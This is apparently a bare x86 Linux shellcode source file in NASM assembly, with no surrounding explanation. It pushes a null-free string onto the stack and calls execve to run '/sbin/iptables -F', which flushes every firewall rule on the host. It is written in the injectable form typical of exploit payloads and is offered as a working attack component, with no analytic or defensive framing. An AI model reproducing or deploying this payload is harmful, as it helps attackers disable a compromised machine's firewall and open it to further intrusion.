global _start

section .text

_start:
	xor eax,eax
	push eax
	push word 0x462d
	mov esi,esp
	push eax
	push dword 0x73656c62
	push dword 0x61747069
	push dword 0x2f6e6962
	push dword 0x732f2f2f
	mov ebx,esp
	push eax
	push esi
	push ebx
	mov ecx,esp
	mov edx,eax
	mov al,0xb
	int 0x80
